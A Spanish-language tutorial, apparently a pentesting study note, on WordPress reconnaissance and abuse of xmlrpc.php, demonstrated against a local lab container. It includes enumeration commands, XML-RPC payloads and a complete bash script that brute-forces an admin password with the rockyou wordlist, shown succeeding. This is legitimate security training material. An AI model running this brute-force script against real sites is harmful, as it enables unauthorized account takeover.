WordPress es un CMS de código abierto muy popular que fue lanzado en 2003. Es utilizado por millones de sitios web en todo el mundo y se destaca por su facilidad de uso y flexibilidad. Con WordPress, los usuarios pueden crear y personalizar sitios web sin necesidad de conocimientos de programación avanzados. Además, cuenta con una amplia variedad de plantillas y plugins que permiten añadir funcionalidades adicionales al sitio.

# Reconocimiento

Una de las primeras cosas a probar sería ver si el panel de login del administrador está en la ruta por defecto, es decir en `wp-admin`.

## Usuarios

Además en caso de estar por defecto, en cada publicación se nos mostrará el autor, que puede ser un usuario potencial. Si además conocemos la ruta del panel de administración, simplemente introduciéndolo podemos validar si existe en base al error que nos reporta (*Unknown username/wrong password*).

También, utilizando [[searchsploit]]:

```bash
searchsploit wordpress user enumeration
```
```exploit-db
[...]
WordPress Core < 4.7.1 - Username Enumeration | php/webapps/41497.php
[...]
```

## Plugins

Una buena herramienta para buscar plugins e información [[wpscan]].

Manualmente, podríamos tratar de entrar a `/wp-content/plugins/`, es decir donde se guardan los plugins; intentar ver el código fuente; hacer un [[curl]]...

## Credenciales

Se puede también comprobar si está expuesto el `xmlrpc.php`. Este archivo es una característica de WordPress que permite la comunicación entre el sitio web y aplicaciones externas utilizando el protocolo **XML-RPC**.

El archivo xmlrpc.php es utilizado por muchos plugins y aplicaciones móviles de WordPress para interactuar con el sitio web y realizar diversas tareas, como publicar contenido, actualizar el sitio y obtener información.

Sin embargo, este archivo también puede ser abusado por atacantes malintencionados para aplicar **fuerza bruta** y descubrir **credenciales válidas** de los usuarios del sitio. Esto se debe a que xmlrpc.php permite a los atacantes realizar un número ilimitado de solicitudes de inicio de sesión sin ser bloqueados, lo que hace que la ejecución de un ataque de fuerza bruta sea relativamente sencilla. Más info [aqui](https://nitesculucian.github.io/2019/07/01/exploiting-the-xmlrpc-php-on-all-wordpress-versions/).

# POC

Para la prueba de concepto utilizaremos el contenedor del siguiente [repo](https://github.com/vavkamil/dvwp). Se nos desplegará un *phpmyadmin* en el puerto 31338 y wordpress por 31337 (debemos configurarlo). 

Si accedemos con el navegador a `localhost:31337`, podremos ver la página principal. Si comprobamos la ubicación del panel de administración, vemos que está en la ruta por defecto (`wp-admin`). Si vemos el autor de las entradas vemos que es el usuario s4vitar (el que hemos creado al configurar el laboratorio), introduciéndolo en el panel podemos verificar que es un usuario válido del sistema.

Jugando con [[whatweb]]:

```bash
whatweb 127.0.0.1:31337
```
```whatweb
http://127.0.0.1:31337 [200 OK] Apache[2.4.38], Cookies[wp_wpfileupload_3553a1d4703dc2d8888df7ebd05c3cf5], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[127.0.0.1], JQuery, MetaGenerator[WordPress 5.3], PHP[7.1.33], PoweredBy[-wordpress,-wordpress,,WordPress], Script[text/javascript], Title[Hack4u Academy &#8211; Just another WordPress site], UncommonHeaders[link], WordPress[5.3], X-Powered-By[PHP/7.1.33]
```

Vemos que está corriendo wordpress 5.3. Vamos a lanzar [[wpscan]]:

```bash
wpscan --url http://127.0.0.1:31337
```

Nos arrojará gran cantidad de información sobre temas, plugins...

Vamos a ver si existe el `xmlrpc.php`:

```bash
curl -s -X POST "http://127.0.0.1:31337/xmlrpc.php"
```

Y vemos que responde, por lo que vamos a tratar de abusarlo. Creamos un archivo con la siguiente estructura *xml*:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```

Ahora, con [[curl]] de nuevo hacemos la petición pasando dicho archivo:

```bash
curl -s -X POST "http://127.0.0.1:31337/xmlrpc.php" -d@file.xml
```
```xml
[...]
  <value><string>wp.getUsersBlogs</string></value>
[...]
```

Der forma que teniendo dicho método disponible, podríamos utilizar una estructura como la siguiente:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<methodCall> 
<methodName>wp.getUsersBlogs</methodName> 
<params> 
<param><value>\{\{your username\}\}</value></param> 
<param><value>\{\{your password\}\}</value></param> 
</params> 
</methodCall>
```

De forma que podríamos crear un script para sacar las credenciales mediante fuerza bruta:

```bash
#!/bin/bash

function ctrl_c(){
    echo -e "\n\n[!] Saliendo..."
    exit 1
}

# Ctl+c
trap ctrl_c SIGINT

function createXML(){
    password=$1
    xmlFile="""
<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<methodCall> 
<methodName>wp.getUsersBlogs</methodName> 
<params> 
<param><value>s4vitar</value></param> 
<param><value>$password</value></param> 
</params> 
</methodCall>"""

    echo $xmlFile > file.txt
    response=$(curl -s -X POST "http://127.0.0.1:31337/xmlrpc.php" -d@file.txt)
    
    if [ ! "$(echo $response | grep 'Incorrect username or password.')" ]; then
        echo -e "\n\n[*] La contraseña para el usuario s4vitar es: $password"
        exit 0
    fi

}

cat /usr/share/wordlists/rockyou.txt | while read password; do
    createXML $password
done
```
```script
[*] La contraseña para el usuario s4vitar es: louise
```

